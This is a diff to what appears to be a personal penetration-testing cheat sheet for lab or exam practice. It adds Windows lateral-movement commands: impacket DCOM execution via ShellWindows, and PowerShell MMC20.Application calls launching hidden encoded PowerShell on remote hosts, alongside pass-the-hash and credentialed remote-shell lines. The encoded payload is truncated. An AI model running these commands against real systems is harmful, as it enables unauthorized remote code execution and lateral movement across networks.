@@ -529,6 +529,10 @@ impacket-wmiexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@192.168
 # dcomexec
 impacket-dcomexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
 impacket-dcomexec -object MMC20 active.htb/Administrator:Ticketmaster1968@10.10.10.100 'powershell -nop -w hidden -e' -silentcommand
+impacket-dcomexec -object ShellWindows active.htb/Administrator:Ticketmaster1968@10.10.10.100 'powershell -nop -w hidden -e' -silentcommand -no-output
+
+-object ShellBrowserWindow 
+
 # evil-winrm
 evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
 # atexec
@@ -711,6 +715,9 @@ Enter-PSSession SRV02.oscp.exam -Authentication Negotiate
 ```powershell
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
 $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e   ","7")
+
+$mmc = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","172.20.0.52"));
+$mmc.Document.ActiveView.ExecuteShellCommand("powershell.exe",$null,"-e JABjAGwAaQBlAG...SNIP...AbwBzAGUAKAApAA==",0)
 ```
 ## RunasCs
 https://github.com/antonioCoco/RunasCs
